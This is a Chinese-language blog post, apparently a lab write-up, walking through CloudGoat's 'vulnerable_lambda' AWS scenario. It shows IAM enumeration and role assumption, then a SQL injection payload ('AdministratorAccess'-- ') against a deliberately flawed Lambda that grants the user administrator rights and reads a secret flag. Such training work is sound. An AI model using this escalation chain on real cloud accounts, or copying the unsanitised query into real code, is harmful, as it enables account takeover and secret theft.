@@ -1,0 +1,411 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CloudGoat (☁️🐐)靶场初体验 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CloudGoat (☁️🐐)靶场初体验 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="一个开源的云靶场：https://github.com/RhinoSecurityLabs/cloudgoat/
+体验顺便学习一下📖
+安装 &amp; 配置
+安装前确保机器：
+
+Linux or MacOS. Windows is not..." />
+    <meta name="keywords" content="CloudGoat,云安全,AWS" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CloudGoat (☁️🐐)靶场初体验
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-07-09
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/udTQ5jCzp/" class="post-tag">
+                  # CloudGoat
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/8Ilrlif21/" class="post-tag">
+                  # 云安全
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/su2_uaPzNg/" class="post-tag">
+                  # AWS
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/cloudgoat-ba-chang-chu-ti-yan.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>一个开源的云靶场：<a href="https://github.com/RhinoSecurityLabs/cloudgoat/">https://github.com/RhinoSecurityLabs/cloudgoat/</a></p>
+<p>体验顺便学习一下📖</p>
+<h1 id="安装-配置">安装 &amp; 配置</h1>
+<p>安装前确保机器：</p>
+<ul>
+<li>Linux or MacOS. Windows is not officially supported.
+<ul>
+<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>
+</ul>
+</li>
+<li>Python3.6+ is required.</li>
+<li>Terraform &gt;= 0.14 installed and in your $PATH.</li>
+<li>The AWS CLI installed and in your $PATH, and an AWS account with sufficient privileges to create and destroy resources.</li>
+<li>jq</li>
+</ul>
+<p>安装流程</p>
+<pre><code>git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
+cd cloudgoat
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install -r ./requirements.txt
+chmod +x cloudgoat.py
+</code></pre>
+<p>然后是两步初始化</p>
+<pre><code>./cloudgoat.py config profile
+./cloudgoat.py config whitelist --auto
+</code></pre>
+<p>cloudgoat会使用本机上 AWS CLI 的配置。编辑配置文件<code>~/.aws/credentials</code>，添加cloudgoat所用的AWS账户的文件段<code>[skyblu3]</code><br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720531972702-e43360e6-83e6-4a6b-b4a6-0b14500a8344.png" alt="image.png" loading="lazy"></p>
+<p><code>./cloudgoat.py config profile</code>输入<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532044190-560aac93-f9fe-46db-8329-92fd9f87c691.png" alt="image.png" loading="lazy"></p>
+<p>第二步是配置云上可以部署的IP列表，云上没什么东西的话就直接<code>--auto</code>自动生成</p>
+<h1 id="靶场初体验">靶场初体验</h1>
+<h2 id="靶场搭建">靶场搭建</h2>
+<p>cloudgoat中有17个靶场，在Github页面的<strong>Scenarios Available</strong>部分可以导航到每个靶场的详情页面。点击第一个<code>vulnerable_lambda</code>靶场。<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532249577-646b0f77-425c-4142-a050-a0029ba124e0.png" alt="image.png" loading="lazy"></p>
+<p>靶场的文档中包含启动的命令、资源列表和攻击路径，在旁边的目录列表也可以看到生成该靶场的tf代码<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532539521-b22352e2-075b-41bc-b628-66c20f5f2102.png" alt="image.png" loading="lazy"></p>
+<p>接下来启动这个靶场</p>
+<pre><code>./cloudgoat.py create vulnerable_lambda
+</code></pre>
+<p>生成成功后拿到这个靶场的初始访问用户<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532685265-09d28116-ed86-4da8-9bd7-759704ae4806.png" alt="image.png" loading="lazy"></p>
+<p>现在就可以开始渗透了</p>
+<h2 id="渗透开始">渗透开始</h2>
+<p>首先看下这个靶场的总结</p>
+<blockquote>
+<p>在此场景中，您以“bilbo”用户身份开始。您将扮演一个具有更多权限的角色，发现一个将策略应用于用户的 lambda 函数，并利用该函数中的漏洞来提升 bilbo 用户的权限以搜索秘密。</p>
+</blockquote>
+<p>用提供的凭证登录bilbo用户<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532908694-31fd1c96-9a36-4d2e-8bc3-118c27abdbd7.png" alt="image.png" loading="lazy"></p>
+<p>策略挖掘，可以看到用户的内联策略</p>
+<pre><code class="language-json">aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720533601842-06de227d-bf47-4655-bf41-b335f6cea1c1.png" alt="image.png" loading="lazy"></figure>
+<p>查看策略具体内容</p>
+<pre><code class="language-json">aws iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463 --policy-name cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer
+{
+    &quot;UserName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;,
+    &quot;PolicyName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer&quot;,
+    &quot;PolicyDocument&quot;: {
+        &quot;Version&quot;: &quot;2012-10-17&quot;,
+        &quot;Statement&quot;: [
+            {
+                &quot;Action&quot;: &quot;sts:AssumeRole&quot;,
+                &quot;Effect&quot;: &quot;Allow&quot;,
+                &quot;Resource&quot;: &quot;arn:aws:iam::940877411605:role/cg-lambda-invoker*&quot;,
+                &quot;Sid&quot;: &quot;&quot;
+            },
+            {
+                &quot;Action&quot;: [
+                    &quot;iam:Get*&quot;,
+                    &quot;iam:List*&quot;,
+                    &quot;iam:SimulateCustomPolicy&quot;,
+                    &quot;iam:SimulatePrincipalPolicy&quot;
+                ],
+                &quot;Effect&quot;: &quot;Allow&quot;,
+                &quot;Resource&quot;: &quot;*&quot;,
+                &quot;Sid&quot;: &quot;&quot;
+            }
+        ]
+    }
+}
+
+</code></pre>
+<p>可以看到该用户对IAM下的所有资源都有List/Get权限！同时他还可以扮演一个<code>cg-lambda-invoker</code>角色。列出所有IAM角色</p>
+<pre><code class="language-json">aws iam list-roles --query &quot;Roles[*].RoleName&quot;
+[
+    &quot;AWSServiceRoleForRDS&quot;,
+    &quot;AWSServiceRoleForResourceExplorer&quot;,
+    &quot;AWSServiceRoleForSupport&quot;,
+    &quot;AWSServiceRoleForTrustedAdvisor&quot;,
+    &quot;cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463&quot;,
+    &quot;vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1&quot;
+]
+</code></pre>
+<p><code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>应该就是下一步要扮演的角色了。不过在assume之前，先看下该角色的策略。另外我对<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>这个角色也挺感兴趣的（毕竟我们有iam:List*/iam:Get*）。</p>
+<p>首先看下<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>，这似乎是cloudgoat用来给靶场中的用户赋权的，同时它还有一个推送日志的权限，似乎是给CloudTrail使用的。</p>
+<pre><code class="language-json">aws iam list-role-policies --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
+aws iam get-role-policy --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --policy-name policy_applier_lambda1
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535122702-94b7bdfc-2239-4a6a-af81-9877a879e37b.png" alt="image.png" loading="lazy"></figure>
+<p>然后是<code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>，它包含对一个Lambda的大部分操作</p>
+<pre><code class="language-json">aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463
+aws iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --policy-name lambda-invoker
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535862712-fbdcfc6b-3041-4cbb-8ae2-44836e3869f4.png" alt="image.png" loading="lazy"></figure>
+<p>现在Assume这个Role</p>
+<pre><code class="language-json">aws sts assume-role --role-arn arn:aws:iam::637423561540:role/cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --role-session-name lambda_invoker
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720536339676-894b1f20-1618-4bbc-9efe-104fe9c89140.png" alt="image.png" loading="lazy"></figure>
+<p>查看function的信息，在<code>Code.Location</code>位置找到函数源码的下载链接</p>
+<pre><code class="language-json">aws lambda get-function --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537386567-091a4ddc-6240-4d72-845f-5c0616875403.png" alt="image.png" loading="lazy"></figure>
+<p>解压源码zip<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537490379-c0cde3bb-f491-4cb1-a2d5-424a8cdca522.png" alt="image.png" loading="lazy"></p>
+<p>打开main.py</p>
+<pre><code class="language-python">import boto3
+from sqlite_utils import Database
+
+db = Database(&quot;my_database.db&quot;)
+iam_client = boto3.client('iam')
+
+
+# db[&quot;policies&quot;].insert_all([
+#     {&quot;policy_name&quot;: &quot;AmazonSNSReadOnlyAccess&quot;, &quot;public&quot;: 'True'}, 
+#     {&quot;policy_name&quot;: &quot;AmazonRDSReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AWSLambda_ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AmazonS3ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AmazonGlacierReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AmazonRoute53DomainsReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
+#     {&quot;policy_name&quot;: &quot;AdministratorAccess&quot;, &quot;public&quot;: 'False'}
+# ])
+
+
+def handler(event, context):
+    target_policys = event['policy_names']
+    user_name = event['user_name']
+    print(f&quot;target policys are : {target_policys}&quot;)
+
+    for policy in target_policys:
+        statement_returns_valid_policy = False
+        statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
+        for row in db.query(statement):
+            statement_returns_valid_policy = True
+            print(f&quot;applying {row['policy_name']} to {user_name}&quot;)
+            response = iam_client.attach_user_policy(
+                UserName=user_name,
+                PolicyArn=f&quot;arn:aws:iam::aws:policy/{row['policy_name']}&quot;
+            )
+            print(&quot;result: &quot; + str(response['ResponseMetadata']['HTTPStatusCode']))
+
+        if not statement_returns_valid_policy:
+            invalid_policy_statement = f&quot;{policy} is not an approved policy, please only choose from approved &quot; \
+                                       f&quot;policies and don't cheat. :) &quot;
+            print(invalid_policy_statement)
+            return invalid_policy_statement
+
+    return &quot;All managed policies were applied as expected.&quot;
+
+
+if __name__ == &quot;__main__&quot;:
+    payload = {
+        &quot;policy_names&quot;: [
+            &quot;AmazonSNSReadOnlyAccess&quot;,
+            &quot;AWSLambda_ReadOnlyAccess&quot;
+        ],
+        &quot;user_name&quot;: &quot;cg-bilbo-user&quot;
+    }
+    print(handler(payload, 'uselessinfo'))
+</code></pre>
+<p>这个函数可以给一个IAM用户赋权，可用的权限就是<code>my_database.db</code>中<code>public</code>值为True的几个</p>
+<pre><code class="language-python">AmazonSNSReadOnlyAccess
+AmazonRDSReadOnlyAccess
+AWSLambda_ReadOnlyAccess
+AmazonS3ReadOnlyAccess
+AmazonGlacierReadOnlyAccess
+AmazonRoute53DomainsReadOnlyAccess
+</code></pre>
+<p>但是用于判断权限是否符合要求的SQL语句<code>statement</code>没有对输入进行检查，而后面用来赋权的<code>attach_user_policy</code>函数用的确实查询出来的<code>row['policy_name']</code>。那我们可以输入<code>AdministratorAccess'-- </code>（使用sqlite的注释）进行注入，给用户赋予一个AWS托管权限<code>arn:aws:iam::aws:policy/AdministratorAccess</code>。这个权限是AWS的最高权限，可以对云上的所有资源进行访问。</p>
+<pre><code class="language-python">statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720538139669-6c39b270-7c23-4811-a2d2-267749d63b7b.png" alt="image.png" loading="lazy"></figure>
+<p>编写payload.json</p>
+<pre><code class="language-json">{
+    &quot;policy_names&quot;: [
+        &quot;AdministratorAccess'-- &quot;
+    ],
+    &quot;user_name&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;
+}
+</code></pre>
+<p>调用函数权限已被设置</p>
+<pre><code>aws lambda invoke --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --payload file://payload.json output &amp;&amp; cat output
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539024560-d4e1f5fd-4f80-4479-a373-308f844c8c8f.png" alt="image.png" loading="lazy"></figure>
+<p>切换回原来的用户，<code>aws configure set aws_session_token &quot;&quot;</code>清空session token。查看用户的托管策略，AdministratorAccess已被成功赋予</p>
+<pre><code class="language-json">aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539655707-f3c0841b-8fec-4171-b979-b5168a8aa0d6.png" alt="image.png" loading="lazy"></figure>
+<p>现在我们已经可以访问云上的所有资源了！列出secret</p>
+<pre><code class="language-json">aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539817522-083c2421-a5df-444c-8bf3-ec4df24d80db.png" alt="image.png" loading="lazy"></figure>
+<p>读取flag</p>
+<pre><code class="language-json">aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidi6d2661463-final_flag  
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539914753-30611895-5b0e-4bbb-9c6d-318a7dae21f1.png" alt="image.png" loading="lazy"></figure>
+<h2 id="攻击路径">攻击路径</h2>
+<p>再看下靶场给的攻击路径，和我们的流程几乎一样。还是挺简单的。<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540014904-a6bb6af5-fc6d-4230-b1b3-2997a19b9d90.png" alt="image.png" loading="lazy"></p>
+<h1 id="解语">解语</h1>
+<p>最后简单浏览下它的tf目录结构，这里云上每个类型的资源都用了单独的文件写。其他的就是一些必要数据源和变量输入输出。<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540350475-60b6dca5-dc7b-4369-a622-222542387101.png" alt="image.png" loading="lazy"></p>
+<p>实验结束，输入<code>./cloudgoat.py destroy vulnerable_lambda</code>清空资源以免产生额外的计费<br>
+<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540459689-ef7190f7-edd2-4029-b07c-1bf3ee270b71.png" alt="image.png" loading="lazy"></p>
+<p>画饼：学习这个项目的代码流程，重点是tf代码的编写</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%AE%89%E8%A3%85-%E9%85%8D%E7%BD%AE">安装 &amp; 配置</a></li>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E5%88%9D%E4%BD%93%E9%AA%8C">靶场初体验</a>
+<ul>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA">靶场搭建</a></li>
+<li><a href="#%E6%B8%97%E9%80%8F%E5%BC%80%E5%A7%8B">渗透开始</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84">攻击路径</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E8%AF%AD">解语</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/zai-aws-shang-shi-yong-you-er-yong-hu-bu-huo-gong-ji-zhe/">
+              <h3 class="post-title">
+                在AWS上使用诱饵用户捕获攻击者
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
